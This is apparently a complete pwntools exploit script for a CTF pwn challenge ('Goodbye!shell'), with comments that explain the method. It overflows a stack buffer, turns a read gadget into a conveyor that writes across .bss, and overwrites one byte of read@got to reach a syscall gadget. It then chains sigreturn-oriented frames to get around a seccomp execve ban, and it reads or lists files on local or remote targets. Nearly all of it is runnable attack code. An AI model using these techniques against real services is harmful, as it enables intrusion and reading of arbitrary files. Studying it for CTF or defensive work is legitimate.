#!/usr/bin/env python3
# 12067 Goodbye!shell (v4)  --  2026 羊城杯 (DASCTF)  [MEDIUM / pwn]
#
# vuln(): read(0, rbp-0x20, 0x30)  ->  saved rbp + saved rip under control (16B)
# seccomp: SCMP_ACT_ALLOW, SCMP_ACT_KILL only for execve(59) / execveat(322).
#
# Gadget 0x40122b: lea rax,[rbp-0x20]; mov edx,0x30; mov rsi,rax; mov edi,0;
#                  call read@plt; write(1,"Goodbye!s",9); leave; ret
#   rbp is fully controlled => read(0, rbp-0x20, 0x30) is an arbitrary 0x30-byte
#   write whose trailing leave;ret takes (rbp,rip) from [X+0x20]/[X+0x28]
#   => a conveyor that fills all of .bss, 0x30 bytes at a time.
#   0x401227 is the same gadget preceded by `sub rsp,0x20`; that moves the call's
#   pushed return address from [entry_rsp-8] to [entry_rsp-0x28], i.e. from
#   (previous window + 0x28) to (previous window + 0x08).  Picking the entry
#   gadget per step is what keeps the sigframes intact (see below).
#
#   A short read() stores only the bytes it received, so the same primitive is a
#   byte-granular partial overwrite: read@got (0x404038) holds libc `read` =
#   base+0x114920 and libc's base is page aligned, so writing one byte 0x30
#   there turns it into base+0x114930 ==
#        syscall ; cmp rax,0xfffffffffffff000 ; ja err ; ret
#   with NO libc-base knowledge.
#
#   Final pivot: read-site with rbp = 0x2f -> lea rax,[0x2f-0x20] == 15 ==
#   __NR_rt_sigreturn, then `call read@plt` jumps into that syscall => SROP.
#   Frame #1 runs openat(AT_FDCWD, path, 0); each following syscall is its own
#   SROP (trigger = pop rbp; 0x2f; read_site), which gives full control of
#   rdi/rsi/rdx/r10 — needed because AT_FDCWD (-100) is a full 64-bit value and
#   the binary's only arg-setup gadget does `mov edi,imm32`.
#
#   Sigframe layout vs the conveyor: a step's call corrupts exactly one qword of
#   the *previous* window, at +0x08 (0x401227 entry) or +0x28 (0x40122b entry).
#   Frames are written as six windows at offsets {0x00,0x38,0x50,0x70,0x90,0xb0}
#   in that order, so every field rt_sigreturn needs sits at offset 0/0x10/0x18
#   of its window and the forced/consumed qwords land on uc_link, r11, r12,
#   r14, rbp, rcx, oldmask, cr2.  The entry that follows a frame's 0xb0 window
#   uses the 0x40122b form so the one remaining casualty lands on cr2 instead of
#   the cs/ss qword (cs must stay __USER_CS/__USER_DS: the kernel does not force
#   it, a bad selector aborts the iret with SIGSEGV/SI_KERNEL).
import os
import sys
import time

from pwn import *

context.arch = "amd64"
context.log_level = os.environ.get("LOG", "info")

HERE = os.path.dirname(os.path.abspath(__file__))
# local training mode: point CHAL_DIR at the unpacked attachment (pwn/libc/ld)
CHAL_DIR = os.environ.get("CHAL_DIR", HERE)

READ_SITE = 0x40122B        # lea rax,[rbp-0x20]; ... (push lands at prev+0x28)
SITE_CONV = 0x401227        # sub rsp,0x20; lea ...   (push lands at prev+0x08)
LEAVE_RET = 0x40125B
POP_RBP = 0x401297          # pop rbp ; ret
READ_PLT = 0x4010C0         # endbr64 ; bnd jmp [read@got]
READ_GOT = 0x404038
GADGET_BYTE = 0x30          # libc+0x114930

AT_FDCWD = 0xFFFFFFFFFFFFFF9C
SYS_SENDFILE = 40
SYS_OPENAT = 257
SS_DISABLE = 2
CS_SS_QWORD = 0x002B000000000033     # cs=0x33(__USER_CS) ss=0x2b(__USER_DS)

# ---- .bss layout (0x404000..0x405000 is one RW page) ----
F1 = 0x404060               # frame 1 = the pushed slot of the final read-site
C2, C3, C4 = 0x404200, 0x404400, 0x404600    # trigger chains, frame i = Ci+0x10
PATHSTR = 0x404F00
FINAL_WIN = 0x404048        # plants [0x404058]=0x2f, [0x404060]=read_site
# 0xd0 comes second: it zeroes sigcontext.fpstate (0xe0), which the loader leaves
# dirty in this page; the rest of the frame is laid out so that the one qword a
# step corrupts is always a field rt_sigreturn ignores.
FRAME_OFFS = [0x00, 0xD0, 0x38, 0x50, 0x70, 0x90, 0xB0]


def build_frame(rax, rdi, rsi, rdx, r10, rip, rsp):
    """sigframe bytes, placed exactly at rsp when rt_sigreturn executes"""
    f = SigreturnFrame()
    f.rax, f.rdi, f.rsi, f.rdx, f.r10 = rax, rdi, rsi, rdx, r10
    f.rip, f.rsp = rip, rsp
    b = bytearray(bytes(f))
    b[0x18:0x1C] = p32(SS_DISABLE)       # uc_stack.ss_flags
    b[0x00:0x08] = p64(READ_SITE)        # uc_flags slot doubles as trigger ret
    b[0xB0:0xB8] = p64(0x202)            # eflags (IF, no TF/NT)
    b[0xB8:0xC0] = p64(CS_SS_QWORD)      # cs/gs/fs/ss
    return bytes(b)


class Conv:
    """ordered window list; each entry also carries the gadget that ENTERS it"""

    def __init__(self, io):
        self.io = io
        self.list = []           # (window_addr, 0x20 payload, entry_gadget)

    def add(self, addr, data20, gadget=SITE_CONV):
        assert len(data20) == 0x20, (hex(addr), len(data20))
        self.list.append((addr, data20, gadget))

    def add_frame(self, base, frame):
        for off in FRAME_OFFS:
            self.add(base + off, frame[off:off + 0x20])

    def post_frame(self):
        """the entry that follows a frame's last window must use the 0x40122b
        form so its pushed return address lands on cr2, not on cs/ss"""
        return READ_SITE

    def fire(self, last_rbp, last_rip, first_rbp):
        self.io.send(b"\x00" * 0x20 + p64(first_rbp) + p64(SITE_CONV))
        self.io.recvuntil(b"Goodbye!s", timeout=6)
        for i, (addr, data, _g) in enumerate(self.list):
            if i + 1 < len(self.list):
                nxt, _d, g = self.list[i + 1]
                rbp, rip = nxt + 0x20, g
            else:
                rbp, rip = last_rbp, last_rip
            self.io.send(data + p64(rbp) + p64(rip))
            self.io.recvuntil(b"Goodbye!s", timeout=6)


def explode(io, path):
    cv = Conv(io)

    fr1 = build_frame(SYS_OPENAT, AT_FDCWD, PATHSTR, 0, 0, READ_PLT, C2)
    fr2 = build_frame(SYS_SENDFILE, 1, 3, 0, 0x200, READ_PLT, C3)
    fr3 = build_frame(SYS_SENDFILE, 1, 4, 0, 0x200, READ_PLT, C4)
    fr4 = build_frame(SYS_SENDFILE, 1, 5, 0, 0x200, READ_PLT, 0x4141414141414141)

    cv.add_frame(F1, fr1)
    for c, fr in ((C2, fr2), (C3, fr3), (C4, fr4)):
        cv.add(c - 0x10, b"\x00" * 0x10 + p64(POP_RBP) + p64(0x2F), gadget=READ_SITE)
        cv.add_frame(c + 0x10, fr)

    pstr = path.encode() + b"\x00"
    cv.add(PATHSTR, pstr + b"\x00" * (0x20 - len(pstr)), gadget=READ_SITE)

    # final window: plants the trigger's (rbp,rip) = (0x2f, read_site) and pivots
    # straight into the redirecting read-site with rbp = 0x404058 (so it reads
    # 0x404038 and rewrites read@got's low byte)
    cv.add(FINAL_WIN, b"\x00" * 0x10 + p64(0x2F) + p64(READ_SITE), gadget=SITE_CONV)

    cv.fire(last_rbp=0x404058, last_rip=SITE_CONV, first_rbp=F1 + 0x20)

    # redirect read: ONE byte -> read@got low byte 0x20 -> 0x30
    io.send(bytes([GADGET_BYTE]))
    io.recvuntil(b"Goodbye!s", timeout=6)
    log.info("conveyor done (%d windows); SROP fired", len(cv.list) + 1)



SYS_GETDENTS64 = 217
SYS_WRITE = 1
DENTBUF = 0x404A00


def exploit(io, frames_spec, path=None):
    cv = Conv(io)
    n = len(frames_spec)
    cs = [C2, C3, C4][:max(0, n - 1)]
    addrs = [C2, C3, C4]

    def fr(i):
        rax, rdi, rsi, rdx, r10 = frames_spec[i]
        # after syscall i the gadget `ret`s to [rsp]; rsp must be the NEXT
        # trigger chain address (whose [0] is pop-rbp), not the frame itself
        rsp = addrs[i] if i + 1 < n else 0x4141414141414141
        return build_frame(rax, rdi, rsi, rdx, r10, READ_PLT, rsp)

    cv.add_frame(F1, fr(0))
    for i in range(1, n):
        c = addrs[i - 1]
        cv.add(c - 0x10, b"\x00" * 0x10 + p64(POP_RBP) + p64(0x2F), gadget=READ_SITE)
        cv.add_frame(c + 0x10, fr(i))
    if path is not None:
        pstr = path.encode() + b"\x00"
        cv.add(PATHSTR, pstr + b"\x00" * (0x20 - len(pstr)), gadget=READ_SITE)
    cv.add(FINAL_WIN, b"\x00" * 0x10 + p64(0x2F) + p64(READ_SITE), gadget=SITE_CONV)
    cv.fire(last_rbp=0x404058, last_rip=SITE_CONV, first_rbp=F1 + 0x20)
    io.send(bytes([GADGET_BYTE]))
    io.recvuntil(b"Goodbye!s", timeout=6)
    time.sleep(0.8)
    return io.recvrepeat(3)


def try_path(io_factory, path):
    """openat(path) then sendfile(1, fd, 0, 0x200) for fd 3/4/5"""
    spec = [(SYS_OPENAT, AT_FDCWD, PATHSTR, 0, 0)]
    for fd in (3, 4, 5):
        spec.append((SYS_SENDFILE, 1, fd, 0, 0x200))
    io = io_factory()
    io.recvuntil(b"Give me your name: ", timeout=8)
    out = exploit(io, spec, path)
    io.close()
    return out


def try_listdir(io_factory, path="/"):
    """openat(dir) + getdents64(fd, DENTBUF, 0x400) for fd 3/4/5 + write it out"""
    spec = [(SYS_OPENAT, AT_FDCWD, PATHSTR, 0, 0),
            (SYS_GETDENTS64, 3, DENTBUF, 0x400, 0),
            (SYS_GETDENTS64, 4, DENTBUF, 0x400, 0),
            (SYS_WRITE, 1, DENTBUF, 0x400, 0)]
    io = io_factory()
    io.recvuntil(b"Give me your name: ", timeout=8)
    out = exploit(io, spec, path)
    io.close()
    return out


def main():
    host = port = None
    path = None
    mode = "try"
    tries = None
    for a in sys.argv[1:]:
        if a.startswith("--host="):
            host = a.split("=", 1)[1]
        elif a.startswith("--port="):
            port = int(a.split("=", 1)[1])
        elif a.startswith("--path="):
            path = a.split("=", 1)[1]
        elif a == "--ls":
            mode = "ls"
        elif a == "--single":
            mode = "single"

    if host:
        def factory():
            return remote(host, port)
    else:
        def factory():
            return process([os.path.join(CHAL_DIR, "ld-linux-x86-64.so.2"),
                            "--library-path", CHAL_DIR, os.path.join(CHAL_DIR, "pwn")],
                           cwd=CHAL_DIR)

    if mode == "ls":
        out = try_listdir(factory, path or "/")
        sys.stdout.write("\n=== OUTPUT ===\n" + out.decode("latin-1") + "\n=== END ===\n")
        return

    if mode == "single":
        cands = [path or "flag"]
    elif path:
        cands = [path]
    else:
        cands = ["/flag", "flag", "/flag.txt", "/home/ctf/flag", "/app/flag",
                 "./flag", "/flag/flag", "/pwn/flag", "/home/pwn/flag"]

    for p in cands:
        sys.stdout.write("\n=== try path=%s ===\n" % p)
        sys.stdout.flush()
        try:
            out = try_path(factory, p)
        except Exception as e:
            sys.stdout.write("  [!] %s: %s\n" % (p, type(e).__name__))
            continue
        txt = out.decode("latin-1")
        sys.stdout.write("\n=== OUTPUT ===\n" + txt + "\n=== END ===\n")
        sys.stdout.flush()
        low = txt.lower()
        if "{" in txt and "}" in txt:
            print("[+] candidate flag text above")
            break


if __name__ == "__main__":
    main()
